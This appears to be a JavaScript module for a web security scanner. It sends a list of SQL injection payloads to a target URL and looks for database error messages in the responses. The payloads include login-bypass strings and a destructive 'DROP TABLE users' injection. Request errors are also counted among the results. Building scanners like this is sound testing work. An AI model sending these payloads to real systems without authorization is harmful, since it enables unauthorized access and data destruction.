// src/scanners/SQLInjectionScanner.js
const BaseScanner = require('./BaseScanner');
const axios = require('axios');

class SQLInjectionScanner extends BaseScanner {
	constructor() {
		super('SQL Injection');
	}

	async startScan(target) {
		// Basic SQL Injection payloads
		const payloads = [
			"' OR '1'='1",
			"'; DROP TABLE users; --",
			"' OR '1'='1' --",
			"' OR '1'='1' /*",
			"admin' --",
			"admin' #",
			"admin'/*",
			"' OR 1=1--",
			"\" OR 1=1--",
			"OR 1=1",
			"' OR 'a'='a",
			"' OR 1 -- -"
		];

		let results = [];

		for (let payload of payloads) {
			try {
				const response = await axios.get(`${target}?input=${payload}`);
				if (this.isVulnerable(response.data)) {
					results.push(`Vulnerable to SQL Injection with payload: ${payload}`);
				}
			} catch (error) {
				results.push(`Error testing payload ${payload}: ${error.message}`);
			}
		}

		const finalResult = results.length > 0 ? results.join('\n') : 'No SQL Injection vulnerabilities found.';
		this.logResult(finalResult);
		return finalResult;
	}

	isVulnerable(responseData) {
		// Basic heuristic to detect SQL error messages in the response
		const errorIndicators = [
			"You have an error in your SQL syntax",
			"Warning: mysql_fetch_array()",
			"Unclosed quotation mark",
			"quoted string not properly terminated"
		];

		return errorIndicators.some(indicator => responseData.includes(indicator));
	}
}

module.exports = SQLInjectionScanner;
